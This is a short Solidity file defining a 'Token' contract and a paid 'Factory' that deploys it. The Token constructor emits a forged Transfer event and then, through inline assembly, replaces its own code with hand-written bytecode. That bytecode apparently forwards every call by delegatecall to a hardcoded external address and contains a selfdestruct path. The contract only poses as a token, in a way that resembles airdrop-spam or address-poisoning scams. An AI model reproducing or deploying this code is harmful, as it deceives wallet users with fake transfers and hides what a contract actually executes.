pragma solidity ^0.6.0;

contract Token {
    event Transfer(address indexed from, address indexed to, uint256 value);
    
    constructor(address to, string memory name) public {
        emit Transfer(msg.sender, to, 1);
        
        bytes memory bytecode = hex"73413af3fcce90ee88b4f34f9ed6f10269836060c23033146100405736600060003760003660006000935af43d600060003e1561003b573d6000f35b3d6000fd5bff";
        
        assembly {
            let stringLen := mload(name)
            let ptr := add(bytecode, 0x20)
            let addr := shl(0x60, to)
            mstore(add(ptr, 66), addr)
            mstore(add(ptr, 86), mload(add(name, 0x20)))
            return(ptr, add(86, mload(name)))
        }
    }
}

contract Factory {
    address payable private owner;
    
    constructor() public {
        owner = msg.sender;
    }
    
    function withdraw() public {
        owner.transfer(address(this).balance);
    }
    
    function createToken(address to, string memory name) public payable returns (address tokenAddress) {
        tokenAddress = address(new Token(to, name));
    }
}